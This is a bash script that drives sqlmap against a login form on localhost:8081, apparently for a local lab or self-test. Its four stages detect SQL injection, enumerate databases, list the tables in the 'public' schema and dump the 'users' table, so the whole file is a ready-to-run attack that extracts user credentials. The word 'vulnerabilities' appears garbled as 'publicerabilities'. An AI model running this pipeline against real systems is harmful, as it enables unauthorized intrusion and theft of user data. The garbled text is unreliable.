#!/bin/bash

echo "=== Using sqlmap on login form ==="

if ! command -v sqlmap &> /dev/null; then
    echo "sqlmap not found!"
    echo "Install: sudo apt install sqlmap"
    exit 1
fi

echo "Target: http://localhost:8081/login"
echo "Testing for SQL injection publicerabilities..."
echo ""

echo "=== Test 1: Basic publicerability detection ==="
sqlmap -u "http://localhost:8081/login" \
  --data="username=admin&password=test" \
  --batch \
  --level=2 \
  --risk=2 \
  --ignore-code=401 \
  --technique=BEUSTQ

echo -e "\n"

echo "=== Test 2: Enumerating databases ==="
sqlmap -u "http://localhost:8081/login" \
  --data="username=admin&password=test" \
  --dbs \
  --batch \
  --ignore-code=401

echo -e "\n"

# Извлечение таблиц из public
echo "=== Test 3: Enumerating tables in public ==="
sqlmap -u "http://localhost:8081/login" \
  --data="username=admin&password=test" \
  -D public \
  --tables \
  --batch \
  --ignore-code=401

echo -e "\n"

# Дамп таблицы users
echo "=== Test 4: Dumping users table ==="
sqlmap -u "http://localhost:8081/login" \
  --data="username=admin&password=test" \
  -D public \
  -T users \
  --dump \
  --batch \
  --ignore-code=401

echo -e "\n=========================================="
echo "SQLMap scan complete!"
echo "Check ~/.local/share/sqlmap/output/ for detailed logs"
echo "=========================================="